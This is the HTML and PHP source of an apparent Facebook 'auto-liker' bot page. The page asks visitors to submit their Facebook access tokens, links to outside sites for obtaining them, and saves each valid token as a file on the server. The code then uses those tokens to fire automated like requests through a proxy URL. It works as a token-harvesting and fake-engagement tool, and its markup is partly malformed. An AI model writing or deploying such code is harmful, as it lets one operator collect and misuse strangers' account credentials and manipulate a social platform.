


<!DOCTYPE html>
<html lang="en">

<meta charset="utf-8">
<title>DJ BOTTER</title>
<center><font color="blue" size="8"><font size="50"<b><script language="JavaScript" src="zis.js" size="520"></script></b></font></font><br><center>
	

  <div id="header">
<style>

@font-face {

    font-family: miaanFont;

    src: url(K.ttf);

}

a

{

  text-decoration: none;

  color:#f6216f;

}

#footer

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 65%;	

}

.form

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 40%;

}

.form1

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 55%;

}

.access

{

	position: absolute;

	vertical-align: center;

	width: 98%;

}

.access h2

{

	margin-top: -15px;

}

input[type=text] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid red;

    background-color: black;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}

input[type=password] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid red;

    background-color: black;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}
    textarea
    {
      resize: none;
      font-family:Lobster;
      width: 60%;
      height: 30%;
      padding: 8px 32px;
      margin: 8px 0;
      font-size:22px;
      box-sizing: border-box;
      border: 2px solid red;
      background-color: black;
      color: white;
      border-radius:50px;
      outline: none;
      text-align: center;
    }    	

.button {

	font-family:miaanFont;

    height: 5%;

    background-color: black; /* Green */

    border: 2px solid red;

    color: blue;

    padding: 8px 32px;

    text-align: center;

    text-decoration: none;

    display: inline-block;

    font-size: 22px;

    margin: 4px 2px;

    -webkit-transition-duration: 0.4s; /* Safari */

    transition-duration: 0.4s;

    cursor: pointer;

}



.button1 {

    background-color: black;

    color: #f6a821;

    border-radius:50px;

}



.button1:hover {

    background-color: #f6216f;

    color: black;

}
<body bgcolor="#f6a821">
body {background: #f6a821 url();margin:0;padding:0;color: #eee;background-size: 1300px 800px;background-repeat: no-repeat;background-position: center
top;}
<body bgcolor="#f6a821">

</style>
<body bgcolor="#f6a821">
</head>



<div id="header">
<h1 class="heading">
    <style>
.snow-container{position:fixed;width:100%;max-width:100%;z-index:99999;pointer-events:none;overflow:hidden;top:0;height:100%}.snow{display:block;position:absolute;z-index:2;top:0;right:0;bottom:0;left:0;pointer-events:none;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0);-webkit-animation:snow linear infinite;animation:snow linear infinite}.snow.foreground{background-image:url("https://vipfb.co/img/snow-large-vipfb.co.png");-webkit-animation-duration:15s;animation-duration:10s}.snow.foreground.layered{-webkit-animation-delay:7.5s;animation-delay:7.5s}.snow.middleground{background-image:url(https://vipfb.co/img/snow-medium-vipfb.co.png);-webkit-animation-duration:20s;animation-duration:15s}.snow.middleground.layered{-webkit-animation-delay:10s;animation-delay:10s}.snow.background{background-image:url(https://vipfb.co/img/snow-small-vipfb.co.png);-webkit-animation-duration:25s;animation-duration:20s}.snow.background.layered{-webkit-animation-delay:12.5s;animation-delay:12.5s}@-webkit-keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}}@keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}} </style> <div class='snow-container'> <div class='snow foreground'></div> <div class='snow foreground layered'></div> <div class='snow middleground'></div> <div class='snow middleground layered'></div> <div class='snow background'></div> <div class='snow background layered'></div> </div><!--  * Contact Developer fb.com/haterxkabaphassan * * Never Give Up . * * Code By Hassan Ali . *--> 
<?php
$yx=opendir('DJ');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> DJ($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function DJ($access){
if(!is_dir('DJ')){
mkdir('DJ');
}
$a=fopen('DJ/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
<br>
<br>
<br><center><a target="_blank" href="http://m.fb.com/100025466832535"><img src="https://graph.facebook.com/100025466832535/picture?type=large" alt="" style="border-radius: 50px; border: 2px; box-shadow: 0px 0px 7px 2px 	#42f4f1; padding: 0px;" width="300" height="300" title=""/></a>
<strong> <font style="color:red;font-size:33px;font-family:miaanFont"><h3 align="center"><font style="background: url( ) color:#f6216f;  font-family:miaanFont;font-size:70px;"> <a href="https://bottersking.com/token" target="_blank">
<center><a href="http://hassantokens.tk/" target="blank"> Get Token </a></center>
</font>
  <center></br><form action=""method="POST"><input class="input" type="text"name="access_token" style="height:28px;" value="">
<input class="button button5" type="submit"name="saveFile" style="height:28px;" '.$warna1.';border:2px groove '.$warna.';height:50px;width:22px"autocomplete="off" value="SUBMIT"onfocus="value="SUBMIT=""></form></center><br>
</font>
<script type="text/javascript" src=""></script>
';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('
'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<br>
<br>
<br>
<center> 
<br>
<br>
<br>
<marquee direction="left"><font size="8" color="gold"><font face="Audiowide" size="5" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em White;">Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<script type="text/javascript" src=""></script>
<form action="keluar.php" method="post">
<center><input class="submit" type="submit" style="width:40%;" value="Click Here To Add AnOther Token"></center>
<br>
<br>
<br>
<center> <center><div style="font-family: Iceland;<font face="Orbitron" size="10" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em red, 0pt 2pt 0.9em gold;"><font color="blue"size="5"> DESIGNED BY :-  <a href="https://www.facebook.com/mrdjayash" target="blank"><font color="red"> TALHA BAIG<br></center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>

</body>
</html>

<h2><center>
Users : <font color="white"> <?php include 'users.php';?> </font></br><center/>
<br><br><marquee behavior="scroll" onmouseover="this.stop()" onmouseout="this.start()" scrollamount="1" scrolldelay="6" direction="left" truespeed="truespeed">
<img src="SP.gif"><font color="red"><b>NOTE:-</b></font> NO BLOCK ✔ COMMENT SO ENJOY AND SHARE SITE TOO*FRNDS
<img src="MS.gif"></marquee>
<script type="text/javascript" src=""></script>
